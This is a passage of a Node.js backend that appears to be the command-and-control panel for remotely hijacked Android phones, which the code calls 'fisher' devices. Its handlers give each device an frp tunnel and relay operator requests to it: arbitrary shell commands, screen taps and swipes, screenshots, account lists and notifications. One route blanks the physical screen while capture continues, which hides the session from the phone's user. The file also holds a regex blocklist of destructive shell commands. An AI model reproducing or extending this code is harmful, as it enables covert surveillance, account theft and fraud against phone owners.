      console.warn(`[API] /api/tunnel/config NO deviceId | url=${req.url} | IP=${req.socket.remoteAddress} | UA=${req.headers['user-agent'] || 'none'} | headers=${JSON.stringify(req.headers)}`);
      res.writeHead(503, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ code: 503, success: false, error: 'deviceId required (X-Device-ID header or body.deviceId)', retryAfter: 1000 }));
      return;
    }
    console.log(`[API] /api/tunnel/config HIT | fullUrl=${req.url} | deviceId=${deviceId} | x-device-id=${req.headers['x-device-id'] || 'none'} | query.deviceId=${tunnelUrl.searchParams.get('deviceId') || 'none'} | UA=${req.headers['user-agent'] || 'none'} | IP=${req.socket.remoteAddress}`);
    // ★ 调试：记录所有 config 请求的原始 headers（临时）
    try {
      const debugLog = path.join(__dirname, '..', 'tunnel-debug.log');
      fs.appendFileSync(debugLog, `[${new Date().toISOString()}] CONFIG_REQ | url=${req.url} | headers=${JSON.stringify(req.headers)}\n`);
    } catch(e) {}

    // ★ 设备请求时查询/分配 remote_port；失败即返回错误，绝不生成 remote_port=0。
    let remotePort = 0;
    try {
      const conn = await dbPool.getConnection();
      let allocatorLock = false;
      try {
        await conn.beginTransaction();
        const [lockRows] = await conn.query(
          "SELECT GET_LOCK('xingchen_remote_port_allocator', 10) AS acquired"
        );
        allocatorLock = Number(lockRows?.[0]?.acquired) === 1;
        if (!allocatorLock) {
          throw new Error('Timed out waiting for remote port allocator lock');
        }
        const [rows] = await conn.execute(
          'SELECT remote_port FROM fisher_devices WHERE device_id = ? FOR UPDATE',
          [deviceId]
        );
        const existingPort = rows.length > 0 ? Number(rows[0].remote_port) : 0;

        if (Number.isInteger(existingPort) && existingPort >= 19902 && existingPort <= 29999) {
          remotePort = existingPort;
          await conn.execute(
            'UPDATE fisher_devices SET tunnel_deployed = 1, last_seen = UNIX_TIMESTAMP() WHERE device_id = ?',
            [deviceId]
          );
          console.log(`[API] /api/tunnel/config 设备 ${deviceId.substring(0, 12)}... 复用 port=${remotePort}`);
        } else {
          // 锁定有效端口集合并取首个空位。端口耗尽时抛错，禁止回绕到 19902。
          const [portRows] = await conn.execute(
            'SELECT remote_port FROM fisher_devices WHERE remote_port >= 19902 AND remote_port <= 29999 FOR UPDATE'
          );
          const occupied = new Set(portRows.map(row => Number(row.remote_port)));
          let newPort = 19902;
          while (newPort <= 29999 && occupied.has(newPort)) newPort++;
          if (newPort > 29999) {
            throw new Error('No available ports (19902-29999 all occupied)');
          }

          const now = Math.floor(Date.now() / 1000);
          await conn.execute(
            `INSERT INTO fisher_devices (device_id, remote_port, tunnel_deployed, is_connected, last_seen, first_seen, created_at)
             VALUES (?, ?, 1, 0, ?, ?, ?)
             ON DUPLICATE KEY UPDATE
               remote_port = IF(remote_port BETWEEN 19902 AND 29999, remote_port, VALUES(remote_port)),
               tunnel_deployed = 1,
               last_seen = VALUES(last_seen)`,
            [deviceId, newPort, now, now, now]
          );
          const [checkRows] = await conn.execute(
            'SELECT remote_port FROM fisher_devices WHERE device_id = ? FOR UPDATE',
            [deviceId]
          );
          remotePort = checkRows.length > 0 ? Number(checkRows[0].remote_port) : 0;
          if (!Number.isInteger(remotePort) || remotePort < 19902 || remotePort > 29999) {
            throw new Error(`Allocated remote port was not persisted: ${remotePort}`);
          }
          console.log(`[API] /api/tunnel/config 现场分配 port=${remotePort} for device=${deviceId.substring(0, 12)}...`);
        }
        await conn.commit();
      } catch (e) {
        await conn.rollback();
        throw e;
      } finally {
        if (allocatorLock) {
          try {
            await conn.query("SELECT RELEASE_LOCK('xingchen_remote_port_allocator')");
          } catch (e) {
            console.error(`[API] failed to release remote port allocator lock: ${e.message}`);
          }
        }
        conn.release();
      }
    } catch (e) {
      console.error(`[API] tunnel/config DB error: ${e.message}`);
      res.writeHead(503, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        code: 503,
        success: false,
        error: 'REMOTE_PORT_UNAVAILABLE',
        message: 'remote port allocation failed',
        retryAfter: 1000,
      }));
      return;
    }

    if (!Number.isInteger(remotePort) || remotePort < 19902 || remotePort > 29999) {
      res.writeHead(503, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        code: 503,
        success: false,
        error: 'REMOTE_PORT_UNAVAILABLE',
        message: 'invalid allocated remote port',
        retryAfter: 1000,
      }));
      return;
    }

    // ★ 19901 跳板已去除：proxy name 始终基于 deviceId 派生
    // 每台设备独立 proxy name = tunnel_<deviceId前8位>
    const proxyName = `tunnel_${deviceId.substring(0, 8)}`;
    const configINI = [
      '[common]',
      `server_addr = ${config.frps.addr}`,
      `server_port = ${config.frps.port}`,
      `token = ${config.frps.token}`,
      '',
      `[${proxyName}]`,
      'type = tcp',
      'local_ip = 127.0.0.1',
      `local_port = ${config.localServicePort}`,
      `remote_port = ${remotePort}`,
      ''
    ].join('\n');
    const tunnelResponse = JSON.stringify({
      success: true,
      frpsAddr: config.frps.addr,
      frpsPort: config.frps.port,
      frpsToken: config.frps.token,
      remotePort: remotePort,
      code: 0,
      data: {
        frpsAddr: config.frps.addr,
        frpsPort: config.frps.port,
        frpsToken: config.frps.token,
        serverAddr: config.frps.addr,
        serverPort: config.frps.port,
        token: config.frps.token,
        remotePort: remotePort,
        localPort: config.localServicePort,
        configINI: configINI
      }
    });
    console.log(`[API] /api/tunnel/config requested by ${deviceId || "unknown"}, remotePort=${remotePort}`);
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(tunnelResponse);
    return;
  }

  // ★ [已迁移到 PHP TunnelController::bootstrap() — 2026-08-05]
  // 请求会 fallthrough 到底部 /api/ 代理 → PHP 8852
  if (false && req.url && req.url.startsWith('/api/tunnel/bootstrap')) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    const bsUrl = new URL(req.url, `http://${req.headers.host}`);
    const deviceId = bsUrl.searchParams.get('deviceId') || '';
    if (!deviceId) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'deviceId required' }));
      return;
    }

    console.log(`[Bootstrap] Starting for device ${deviceId} (no-springboard)`);

    // 辅助：检测端口是否可达
    function checkPort(port, timeout = 3000) {
      return new Promise((resolve) => {
        const req = http.get({ hostname: '127.0.0.1', port, path: '/health', timeout }, (r) => {
          resolve(r.statusCode >= 200 && r.statusCode < 500);
        });
        req.on('error', () => resolve(false));
        req.on('timeout', () => { req.destroy(); resolve(false); });
      });
    }

    try {
      // 1. 查询设备当前 remote_port
      const [rows] = await dbPool.execute('SELECT remote_port FROM fisher_devices WHERE device_id = ? LIMIT 1', [deviceId]);
      let newPort = (rows.length > 0 && rows[0].remote_port > 0) ? rows[0].remote_port : 0;

      // 2. 如果已有独立端口，检测是否可达（可达则返回 already_alive）
      if (newPort > 0) {
        const alive = await checkPort(newPort);
        if (alive) {
          console.log(`[Bootstrap] Device ${deviceId} port ${newPort} already alive`);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: true, status: 'already_alive', remotePort: newPort }));
          return;
        }
      }

      // 3. 未分配端口 → 分配 19902+
      if (newPort === 0) {
        const conn = await dbPool.getConnection();
        try {
          await conn.beginTransaction();
          const [maxRows] = await conn.execute('SELECT MAX(remote_port) as mx FROM fisher_devices WHERE remote_port >= 19902 AND remote_port <= 29999');
          newPort = (maxRows[0]?.mx || 19901) + 1;
          if (newPort < 19902) newPort = 19902;
          let attempts = 0;
          while (attempts < 100 && newPort <= 29999) {
            const [occ] = await conn.execute('SELECT COUNT(*) as c FROM fisher_devices WHERE remote_port = ? AND device_id <> ?', [newPort, deviceId]);
            if (occ[0].c === 0) break;
            newPort++;
            attempts++;
          }
          const now = Math.floor(Date.now() / 1000);
          await conn.execute(
            `INSERT INTO fisher_devices (device_id, remote_port, tunnel_deployed, is_connected, last_seen, first_seen, created_at)
             VALUES (?, ?, 1, 0, ?, ?, ?)
             ON DUPLICATE KEY UPDATE remote_port = VALUES(remote_port), tunnel_deployed = 1, last_seen = VALUES(last_seen)`,
            [deviceId, newPort, now, now, now]
          );
          await conn.commit();
        } catch (e) {
          await conn.rollback();
          throw new Error(`DB allocate port failed: ${e.message}`);
        } finally {
          conn.release();
        }
      }
      console.log(`[Bootstrap] Device ${deviceId} assigned port ${newPort}`);

      // 4. 通知 Go 端重新拉取 config（走 bridge WS 下发 setServerAddr）
      const serverAddr = config.c2.httpBase;
      let bridgeNotifyOk = false;
      try {
        if (typeof broadcastToBridge === 'function') {
          broadcastToBridge(deviceId, {
            type: 'setServerAddr',
            serverAddr,
            commandId: `bootstrap-${Date.now()}`
          });
          bridgeNotifyOk = true;
          console.log(`[Bootstrap] Bridge notified: setServerAddr for ${deviceId}`);
        }
      } catch (e) {
        console.error(`[Bootstrap] Bridge notify failed: ${e.message}`);
      }

      // 5. 轮询等待新端口可达（最多10秒）
      let newPortAlive = false;
      for (let i = 0; i < 10; i++) {
        await new Promise(r => setTimeout(r, 1000));
        newPortAlive = await checkPort(newPort);
        if (newPortAlive) break;
      }

      // 6. 更新数据库状态
      if (newPortAlive) {
        await dbPool.execute('UPDATE fisher_devices SET tunnel_deployed = 1 WHERE device_id = ?', [deviceId]);
        console.log(`[Bootstrap] SUCCESS: device ${deviceId} port ${newPort} is now alive`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, status: 'success', remotePort: newPort, bridgeNotified: bridgeNotifyOk }));
      } else {
        console.log(`[Bootstrap] WAITING: device ${deviceId} port ${newPort} not reachable yet (will retry on next config fetch)`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, status: 'pending', remotePort: newPort, bridgeNotified: bridgeNotifyOk, message: '已分配端口并通知 bridge，请等待设备下次拉取 config' }));
      }
    } catch (e) {
      console.error(`[Bootstrap] Error for ${deviceId}: ${e.message}`);
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: e.message }));
    }
    return;
  }

  // ★ [重新启用 — 2026-08-07] 高频隧道接口走 Node
  if (req.url && req.url.startsWith('/api/tunnel/shell')) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    // Handle preflight
    if (req.method === 'OPTIONS') {
      res.writeHead(204);
      res.end();
      return;
    }
    // 仅接受 POST
    if (req.method !== 'POST') {
      res.writeHead(405, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Method not allowed' }));
      return;
    }
    // security fix: JWT auth required
    const authUser = requireAuth(req);
    if (!authUser) {
      return sendAuthError(res, 401, 'Unauthorized: please login first');
    }
    // security fix: only superadmin/admin can call shell (prevent RCE)
    if (!['superadmin', 'admin'].includes(authUser.role)) {
      return sendAuthError(res, 403, 'Forbidden: admin role required');
    }
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const { cmd, deviceId } = JSON.parse(body);
        if (!cmd) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'cmd required' }));
          return;
        }
        // security fix: block dangerous commands
        const dangerous = /\b(rm\s+-rf|mkfs|dd\s+if=|:(){\s*:\|:&\s*}|format\s+|fdisk|parted)\b/i;
        if (dangerous.test(cmd)) {
          res.writeHead(403, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'Forbidden: dangerous command blocked' }));
          return;
        }
        // security fix: use the same ownership scope as panel WebSocket/PHP.
        // Admins may access direct-child and public devices; public does not bypass authentication.
        if (!await verifyDeviceOwnership(req, deviceId)) {
          return sendAuthError(res, 403, 'Forbidden: not your device');
        }
        const tunnelPort = await getDeviceTunnelPort(deviceId);
        const postData = JSON.stringify({ command: cmd });
        const tunnelReq = http.request({
          hostname: '127.0.0.1',
          port: tunnelPort,
          path: '/execShell',
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) },
          timeout: 10000
        }, (tunnelRes) => {
          let data = '';
          tunnelRes.on('data', chunk => data += chunk);
          tunnelRes.on('end', () => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(data);
          });
        });
        tunnelReq.on('error', (e) => {
          res.writeHead(502, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: `Tunnel error: ${e.message}` }));
        });
        tunnelReq.on('timeout', () => {
          tunnelReq.destroy();
          res.writeHead(504, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'Tunnel timeout' }));
        });
        tunnelReq.write(postData);
        tunnelReq.end();
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  // ★ [重新启用 — 2026-08-07] 高频隧道接口走 Node，不走 PHP
  if (req.url && req.url.startsWith('/api/tunnel/input')) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
    if (req.method !== 'POST') {
      res.writeHead(405, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Method not allowed' }));
      return;
    }
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const { action, params, deviceId } = JSON.parse(body);
        // action: 'tap', 'swipe', 'keyevent', 'back', 'home', 'recents'
        if (!action) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'action required' }));
          return;
        }
        // 归属验证
        if (!(await verifyDeviceOwnership(req, deviceId))) {
          res.writeHead(403, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: '无权操作该设备' }));
          return;
        }
        const tunnelPort = await getDeviceTunnelPort(deviceId);
        // 查询类命令使用 GET，写入类命令使用 POST
    const getActions = ['isDeviceOwner', 'deviceAdmin', 'listAccounts', 'getNotifications', 'accessibilityState', 'screenState', 'getConfig', 'windowListener/status', 'windowListener/getRules'];
        const useGet = getActions.includes(action);
        const postData = useGet ? '' : JSON.stringify(params || {});
        const tunnelReq = http.request({
          hostname: '127.0.0.1',
          port: tunnelPort,
          path: `/${action}`,
          method: useGet ? 'GET' : 'POST',
          headers: useGet ? {} : { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) },
          timeout: 10000
        }, (tunnelRes) => {
          let data = '';
          tunnelRes.on('data', chunk => data += chunk);
          tunnelRes.on('end', () => {
            res.writeHead(tunnelRes.statusCode || 200, { 'Content-Type': 'application/json' });
            res.end(data || JSON.stringify({ success: true }));
          });
        });
        tunnelReq.on('error', (e) => {
          res.writeHead(502, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: `Tunnel error: ${e.message}` }));
        });
        tunnelReq.on('timeout', () => {
          tunnelReq.destroy();
          res.writeHead(504, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'Tunnel timeout' }));
        });
        if (!useGet) tunnelReq.write(postData);
        tunnelReq.end();
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  // ★ /api/tunnel/blackScreen — ADB 独立黑屏线路
  // 仅降低设备物理屏幕亮度，ADB 截图/投屏仍采集正常画面，不依赖无障碍服务。
  // body: { action: 'enable'|'disable', deviceId }
  if (req.url && req.url.startsWith('/api/tunnel/blackScreen')) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
    if (req.method !== 'POST') {
      res.writeHead(405, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Method not allowed' }));
      return;
    }
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const { action, deviceId } = JSON.parse(body);
        if (!action || !['enable', 'disable'].includes(action)) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'action must be enable|disable' }));
          return;
        }
        if (!deviceId) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'deviceId required' }));
          return;
        }
        // 归属验证
        if (!(await verifyDeviceOwnership(req, deviceId))) {
          res.writeHead(403, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: '无权操作该设备' }));
          return;
        }

        const tunnelPort = await getDeviceTunnelPort(deviceId);
        const execFixedShell = (command) => new Promise((resolve, reject) => {
          const postData = JSON.stringify({ command });
          const tunnelReq = http.request({
            hostname: '127.0.0.1',
            port: tunnelPort,
            path: '/execShell',
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Content-Length': Buffer.byteLength(postData)
            },
            timeout: 10000
          }, (tunnelRes) => {
            let data = '';
            tunnelRes.on('data', chunk => data += chunk);
            tunnelRes.on('end', () => {
              if ((tunnelRes.statusCode || 500) >= 400) {
                reject(new Error(`local-service HTTP ${tunnelRes.statusCode}: ${data}`));
                return;
              }
              try {
                const parsed = JSON.parse(data || '{}');
                if (parsed.success === false || parsed.ok === false || parsed.code >= 400) {
                  reject(new Error(parsed.error || parsed.message || 'local-service command failed'));
                  return;
                }
                resolve(parsed);
              } catch (_) {
                resolve({ output: data });
              }
            });
          });
          tunnelReq.on('error', reject);
          tunnelReq.on('timeout', () => {
            tunnelReq.destroy(new Error('local-service timeout'));
          });
          tunnelReq.write(postData);
          tunnelReq.end();
        });

        const getShellOutput = (result) => {
          const output = result?.data?.output ?? result?.data?.stdout ??
            result?.output ?? result?.stdout ?? result?.data ?? '';
          return typeof output === 'string' ? output : JSON.stringify(output);
        };

        if (action === 'enable') {
          if (_adbBlackScreenStates.has(deviceId)) {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, action, deviceId, alreadyActive: true }));
            return;
          }

          const stateResult = await execFixedShell(
            'settings get system screen_brightness; ' +
            'settings get system screen_brightness_mode'
          );
          const stateLines = getShellOutput(stateResult)
            .split(/\r?\n/)
            .map(value => value.trim())
            .filter(value => value.length > 0);
          const brightness = Number(stateLines[0]);
          const mode = Number(stateLines[1]);
          if (!Number.isFinite(brightness) || !Number.isFinite(mode)) {
            throw new Error('读取设备原亮度状态失败');
          }

          const originalState = { brightness, mode };
          // 先切到手动亮度，再通过 DisplayManager 设置 0.0。
          // cmd display 直接作用于物理面板，不受亮度滑动条最低值限制。
          await execFixedShell(
            'settings put system screen_brightness_mode 0; ' +
            'settings put system screen_brightness 1; ' +
            'cmd display set-brightness 0.0'
          );
          _adbBlackScreenStates.set(deviceId, originalState);
          persistAdbBlackScreenStates();
          console.log(`[ADB BlackScreen] enabled → ${deviceId}, saved=${JSON.stringify(originalState)}`);
        } else {
          const originalState = _adbBlackScreenStates.get(deviceId);
          if (!originalState) {
            res.writeHead(409, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: false, error: '未找到该设备的原亮度状态' }));
            return;
          }
          const displayBrightness = Math.max(0, Math.min(1, originalState.brightness / 255));
          await execFixedShell(
            `settings put system screen_brightness ${originalState.brightness}; ` +
            `cmd display set-brightness ${displayBrightness}; ` +
            `settings put system screen_brightness_mode ${originalState.mode}`
          );
          _adbBlackScreenStates.delete(deviceId);
          persistAdbBlackScreenStates();
          console.log(`[ADB BlackScreen] disabled → ${deviceId}, restored=${JSON.stringify(originalState)}`);
        }

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, action, deviceId }));
      } catch (e) {
        const status = /tunnel|local-service|ECONNREFUSED|timeout/i.test(e.message) ? 502 : 400;
        res.writeHead(status, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  // ★ [重新启用 — 2026-08-07] 高频隧道接口走 Node
  if (req.url && req.url.startsWith('/api/tunnel/screenshot')) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    // 从 query 参数获取 deviceId，解析隧道端口
    const screenshotUrl = new URL(req.url, `http://${req.headers.host}`);
    const ssDeviceId = screenshotUrl.searchParams.get('deviceId');
    const tunnelPort = await getDeviceTunnelPort(ssDeviceId);

    // 直接代理 local-service 的 /screenshot 端点（返回原始 PNG 图片）
    const tunnelReq = http.request({
      hostname: '127.0.0.1',
      port: tunnelPort,
      path: '/screenshot',
      method: 'GET',
      timeout: 15000
    }, (tunnelRes) => {
      const contentType = tunnelRes.headers['content-type'] || '';
      // 如果 local-service 直接返回 PNG 图片
      if (contentType.includes('image/') || tunnelRes.statusCode === 200) {
        let chunks = [];
        tunnelRes.on('data', chunk => chunks.push(chunk));
        tunnelRes.on('end', () => {
          const pngBuffer = Buffer.concat(chunks);
          if (pngBuffer.length > 100) {
            // 检查是否为 JSON 响应（可能返回 base64）
            if (contentType.includes('application/json')) {
              try {
                const json = JSON.parse(pngBuffer.toString());
                const b64 = json?.data?.output || json?.data || json?.screenshot || json?.base64 || '';
                if (b64 && b64.length > 100) {
                  const imgBuf = Buffer.from(b64.replace(/\s+/g, ''), 'base64');
                  res.writeHead(200, {
                    'Content-Type': 'image/png',
                    'Content-Length': imgBuf.length,
                    'Cache-Control': 'no-cache, no-store'
                  });
                  res.end(imgBuf);
                  return;
                }
              } catch (e) { /* not JSON, treat as binary */ }
            }
            // 直接返回二进制 PNG
            res.writeHead(200, {
              'Content-Type': 'image/png',
              'Content-Length': pngBuffer.length,
              'Cache-Control': 'no-cache, no-store'
            });
            res.end(pngBuffer);
          } else {
            res.writeHead(502, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: false, error: 'Screenshot too small or empty' }));
          }
        });
      } else {
        res.writeHead(tunnelRes.statusCode || 502, { 'Content-Type': 'application/json' });
        let data = '';
        tunnelRes.on('data', chunk => data += chunk);
        tunnelRes.on('end', () => {
          res.end(JSON.stringify({ success: false, error: `Unexpected response: ${data.substring(0, 200)}` }));
        });
      }
    });
    tunnelReq.on('error', (e) => {
      res.writeHead(502, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: `Tunnel error: ${e.message}` }));
    });
    tunnelReq.on('timeout', () => {
      tunnelReq.destroy();
      res.writeHead(504, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Tunnel timeout' }));
    });
    tunnelReq.end();
    return;
  }

  // ★ [已迁移到 PHP TunnelController::setDeviceId() — 2026-08-05]
  if (false && req.url && req.url.startsWith('/api/tunnel/setDeviceId')) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    const sdUrl = new URL(req.url, `http://${req.headers.host}`);
    const deviceId = sdUrl.searchParams.get('deviceId') || '';
    if (!deviceId) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'deviceId required' }));
      return;
    }

    console.log(`[setDeviceId] Starting for device=${deviceId}`);

    // ★ 19901 跳板已去除：只通过设备独立端口调用 setAppConfig
    const assignedPort = await getDeviceTunnelPort(deviceId);
    const portsToTry = [];
    if (assignedPort && assignedPort > 0) portsToTry.push(assignedPort);
    const serverAddr = config.c2.httpBase;

    // Helper: 尝试在指定端口调用 GET API
    const tryGetOnPort = (port, path) => new Promise((resolve) => {
      const r = http.request({ hostname: '127.0.0.1', port, path, method: 'GET', timeout: 3000 }, (res2) => {
        let data = '';
        res2.on('data', chunk => data += chunk);
        res2.on('end', () => resolve({ ok: true, raw: data, port }));
      });
      r.on('error', (e) => resolve({ ok: false, raw: e.message, port }));
      r.on('timeout', () => { r.destroy(); resolve({ ok: false, raw: 'timeout', port }); });
      r.end();
    });

    // Step 1: 尝试所有端口调用 /setAppConfig
    let setAppConfigResult = { ok: false, raw: 'no port available', port: 0 };
    let workingPort = 0;
    for (const port of portsToTry) {
      const result = await tryGetOnPort(port, `/setAppConfig?deviceId=${encodeURIComponent(deviceId)}&serverAddr=${encodeURIComponent(serverAddr)}`);
      if (result.ok) {
        setAppConfigResult = result;
        workingPort = port;
        break;
      }
      setAppConfigResult = result;
    }
    console.log(`[setDeviceId] setAppConfig result: ok=${setAppConfigResult.ok}, port=${workingPort}, raw=${setAppConfigResult.raw}`);

    if (!setAppConfigResult.ok) {
      res.writeHead(502, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: `setAppConfig failed on ports [${portsToTry.join(',')}]: ${setAppConfigResult.raw}`, portsTriad: portsToTry }));
      return;
    }

    // Step 2: 调用 /setServerAddr 触发 fetchFrpcConfigFromServer（Go 会带上刚保存的 deviceId）
    const setServerAddrResult = await tryGetOnPort(workingPort, `/setServerAddr?serverAddr=${encodeURIComponent(serverAddr)}`);
    console.log(`[setDeviceId] setServerAddr result: ok=${setServerAddrResult.ok}, raw=${setServerAddrResult.raw}`);

    // Step 3: 确保 DB 中有端口分配（★ 19901 跳板已去除：未分配时分配 19902+，不再 fallback 19901）
    let remotePort = 0;
    try {
      const [rows] = await dbPool.execute(
        'SELECT remote_port FROM fisher_devices WHERE device_id = ? LIMIT 1',
        [deviceId]
      );
      if (rows.length > 0 && rows[0].remote_port > 0) {
        remotePort = rows[0].remote_port;
      } else {
        // 分配新端口（19902+，跳过已释放的黑名单）
        const [maxRows] = await dbPool.execute(
          'SELECT MAX(remote_port) as max_port FROM fisher_devices WHERE remote_port >= 19902 AND remote_port <= 29999'
        );
        const maxPort = maxRows[0]?.max_port || 19901;
        remotePort = maxPort + 1;
        while (remotePort <= 29999 && _releasedPorts.has(remotePort)) {
          remotePort++;
        }
        if (remotePort > 29999) {
          console.warn('[setDeviceId] No available ports in 19902-29999 range');
          remotePort = 0;
        }
        if (remotePort > 0) {
          const now = Math.floor(Date.now() / 1000);
          await dbPool.execute(
            `INSERT INTO fisher_devices (device_id, remote_port, tunnel_deployed, is_connected, last_seen, first_seen, created_at)
             VALUES (?, ?, 1, 0, ?, ?, ?)
             ON DUPLICATE KEY UPDATE remote_port = VALUES(remote_port), tunnel_deployed = 1, last_seen = VALUES(last_seen)`,
            [deviceId, remotePort, now, now, now]
          );
          console.log(`[setDeviceId] Assigned new remote_port ${remotePort} to ${deviceId}`);
        }
      }
    } catch (e) {
      console.error(`[setDeviceId] DB error: ${e.message}`);
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      message: `deviceId=${deviceId} pushed to device via port ${workingPort}. setServerAddr triggered refetch. Device will now request /api/tunnel/config with deviceId and get remotePort=${remotePort}`,
      setAppConfig: setAppConfigResult,
      setServerAddr: setServerAddrResult,
      workingPort,
      remotePort
    }));
    return;
  }


// ★ /internal/tunnel-status — 获取隧道监控完整状态（仅 superadmin）
if (req.url && req.url.startsWith('/internal/tunnel-status')) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
  if (!requireSuperAdmin(req)) {
    res.writeHead(403, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: '需要 superadmin 权限' }));
    return;
  }
  try {
    const data = await getTunnelMonitorData();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(data));
  } catch (e) {
    res.writeHead(500, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: e.message }));
  }
  return;
}

// 辅助：通过 frps Dashboard API 关闭 proxy
function closeFrpsProxy(name, type) {
  return new Promise((resolve) => {
    const auth = Buffer.from(`${FRPS_DASHBOARD.user}:${FRPS_DASHBOARD.password}`).toString('base64');
    const req = http.request({
      hostname: FRPS_DASHBOARD.host, port: FRPS_DASHBOARD.port,
      path: `/api/proxy/${type}/${encodeURIComponent(name)}`, method: 'DELETE',
      timeout: 5000, headers: { 'Authorization': `Basic ${auth}` }
    }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => resolve({ status: res.statusCode, body: d }));
    });
    req.on('error', e => resolve({ status: 0, error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 0, error: 'timeout' }); });
    req.end();
  });
}

// ★ /internal/close-frps-proxy — 关闭 frps proxy
if (req.url && req.url.startsWith('/internal/close-frps-proxy')) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
  if (!requireSuperAdmin(req)) {
    res.writeHead(403, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: false, error: '需要 superadmin 权限' }));
    return;
  }
  const u = new URL(req.url, `http://${req.headers.host}`);
  const proxyName = u.searchParams.get('proxyName');
  const proxyType = u.searchParams.get('type') || 'tcp';
  if (!proxyName) {
